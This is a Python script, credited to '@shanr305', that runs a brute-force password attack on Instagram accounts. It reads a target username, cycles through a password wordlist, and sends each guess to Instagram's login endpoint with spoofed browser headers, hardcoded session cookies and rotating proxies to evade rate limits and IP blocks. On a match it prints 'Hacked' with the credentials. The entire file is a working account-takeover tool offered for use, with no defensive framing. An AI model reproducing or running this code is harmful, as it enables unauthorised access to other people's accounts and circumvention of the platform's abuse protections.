try:
	import requests,random,time,os
	from colorama import Fore
except ModuleNotFoundError:
	os.system('pip install requests')
	os.system('pip install colorama')
	print('\n\t>[+] Done Downloading ')
bad=0
error=0
badproxy=0
block=0
cpu=0
proxy = open('proxy.txt', 'r').read().splitlines()
r = requests.session()
print(Fore.GREEN+"""
[$] Brute Force
 ___ _   _     _        
|_ _| \ | |___| |_ __ _ 
 | ||  \| / __| __/ _` |
 | || |\  \__ \ || (_| |
|___|_| \_|___/\__\__,_|                        
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""+Fore.RESET)
print("By @shanr305 ")
user=input('[?] Enter username : ')
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
pess = open('pass.txt').read().splitlines()
proxylist = []
while True:
	for pxr in proxy:
		proxylist.append(pxr)
		pxx = str(random.choice(proxylist))  
	for pess in pess:
		headers = {
			'Host': 'www.instagram.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
			'Accept': '*/*',
			'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
			'Accept-Encoding': 'gzip, deflate, br',
			'X-CSRFToken': '5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect',
			'X-Instagram-AJAX': '1d6caaf37cd2',
			'X-IG-App-ID': '936619743392459',
			'X-ASBD-ID': '437806',
			'X-IG-WWW-Claim': '0',
			'Content-Type': 'application/x-www-form-urlencoded',
			'X-Requested-With': 'XMLHttpRequest',
			'Content-Length': '347',
			'Origin': 'https://www.instagram.com',
			'Connection': 'keep-alive',
			'Referer': 'https://www.instagram.com/accounts/login/',
			'Cookie': 'ig_did=7B796F1F-ADE7-429C-8ADB-9B131663E5E4; datr=2kDRYNWmjctteBSnOqogPrxv; csrftoken=5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect; mid=YNIa4QALAAGoeESFP8axY9NfC9t3; ig_nrcb=1',
			'TE': 'Trailers'}
		data={
				'username':user,
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{pess}',
				'queryParams':"{}",
				'optIntoOneTap':'false',
				'stopDeletionNonce ':"",
				'trustedDeviceRecords':"{}"}
		try:
			proxx = {
				'http': f'http://{pxx}',
				'https': f'http://{pxx}'}
			time.sleep(0.1)
			req=requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers,data=data, proxies=proxx, timeout=3)
			if '"authenticated":true' in req.text:
				print('\n--------------------------------')
				print(f'\nHacked: {user}:{pess} End with {cpu} Attempts')
				cpu+=1
				exit()
			elif req.status_code == "429":
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				block+=1
				cpu+=1
			elif 'ip_block' in req.text:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				block+=1
				cpu+=1
			elif 'Please wait a few minutes before you try again.' in req.text:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				block+=1
				cpu+=1
			elif 'We limit how often you can do certain things on Instagram to protect our community. Tell us if you think we made a mistake.' in req.text:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')                     
				block+=1
				cpu+=1
			elif '"authenticated":false' in req.text:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				bad+=1
				cpu+=1
			elif '"user":true,"authenticated":false' in req.text:                                                       
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				bad+=1
				cpu+=1
			elif '"checkpoint_url"' in req.text:
				print('\nSECURE')
				break
			elif 'Sorry, there was a problem with your request.' in req.text:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				error+=1
				cpu+=1
			else:
				print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
				error+=1
				cpu+=1
		except requests.exceptions.ConnectionError:
			pass
			print(f"\rAttempts [{cpu}] Bad [{bad}] Error [{error}] Bad Proxy [{badproxy}] Blocked [{block}] {user}:{pess}",end='')
			badproxy+=1
			cpu+=1
